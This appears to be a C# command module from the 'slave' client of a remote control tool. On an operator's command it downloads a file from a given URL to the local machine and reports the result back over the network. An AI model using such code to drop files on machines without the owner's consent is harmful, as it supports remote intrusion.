using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;

namespace Slave.Commands
{
    internal class DownloadUrl : ICommand
    {
        public string name { get; } = "downloadurl";

        public void Process(List<string> args)
        {
            var url = args[0];
            var newFile = url.Split('/').Last();

            var Client = new WebClient();
            try
            {
                Client.DownloadFile(url, newFile);
                SlaveCommandsManager.networkManager.WriteLine("Success");
            }
            catch (IOException)
            {
                SlaveCommandsManager.networkManager.WriteLine("IO");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(newFile);
                SlaveCommandsManager.networkManager.WriteLine("Web");
            }
        }
    }
}
